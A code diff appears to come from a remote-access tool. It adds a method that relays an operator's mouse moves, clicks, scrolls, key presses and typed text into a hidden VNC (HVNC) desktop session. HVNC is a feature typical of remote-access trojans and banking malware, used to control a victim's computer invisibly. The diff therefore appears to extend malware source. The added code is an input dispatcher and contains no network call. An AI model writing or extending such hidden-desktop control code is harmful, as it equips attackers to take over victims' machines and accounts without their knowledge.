@@ -586,6 +586,66 @@ class HVNCActions:
             logger.error("Failed to get HVNC frame: %s", exc)
             return {"action": "hvnc_get_frame", "success": False, "error": str(exc)}
     
+    def handle_control(self, payload: dict) -> bool:
+        """Handle mouse/keyboard control command for HVNC desktop.
+        
+        Args:
+            payload: Control payload with type and coordinates
+            
+        Returns:
+            True if handled successfully, False if HVNC not active
+        """
+        if not self.is_active or not self._session:
+            return False
+        
+        msg_type = payload.get("type")
+        if not msg_type:
+            return False
+        
+        try:
+            x = int(payload.get("x", 0))
+            y = int(payload.get("y", 0))
+            
+            if msg_type == "mouse_move":
+                self._session.mouse_move(x, y)
+            elif msg_type == "mouse_down":
+                button = payload.get("button", "left")
+                self._session.mouse_down(x, y, button)
+            elif msg_type == "mouse_up":
+                button = payload.get("button", "left")
+                self._session.mouse_up(x, y, button)
+            elif msg_type == "mouse_click":
+                button = payload.get("button", "left")
+                self._session.mouse_click(x, y, button)
+            elif msg_type == "mouse_scroll":
+                delta_x = int(payload.get("delta_x", 0))
+                delta_y = int(payload.get("delta_y", 0))
+                self._session.mouse_scroll(x, y, delta_x, delta_y)
+            elif msg_type == "key_down":
+                key = payload.get("key", "")
+                if key:
+                    self._session.key_down(key)
+            elif msg_type == "key_up":
+                key = payload.get("key", "")
+                if key:
+                    self._session.key_up(key)
+            elif msg_type == "keypress":
+                key = payload.get("key", "")
+                if key:
+                    self._session.key_press(key)
+            elif msg_type in ("text", "text_input"):
+                text = payload.get("text", "")
+                if text:
+                    self._session.type_text(text)
+            else:
+                logger.debug("Unknown HVNC control type: %s", msg_type)
+                return False
+            
+            return True
+        except Exception as exc:
+            logger.warning("HVNC control error: %s", exc)
+            return False
+    
     def handle_action(self, action: str, payload: dict) -> dict:
         """Handle HVNC action from operator.
         
@@ -654,3 +714,15 @@ def get_hvnc_actions() -> HVNCActions:
 def handle_hvnc_action(action: str, payload: dict) -> dict:
     """Handle HVNC action - convenience function."""
     return get_hvnc_actions().handle_action(action, payload)
+
+
+def handle_hvnc_control(payload: dict) -> bool:
+    """Handle HVNC control command (mouse/keyboard) - convenience function.
+    
+    Args:
+        payload: Control payload with 'type' and input data
+        
+    Returns:
+        True if handled, False otherwise
+    """
+    return get_hvnc_actions().handle_control(payload)
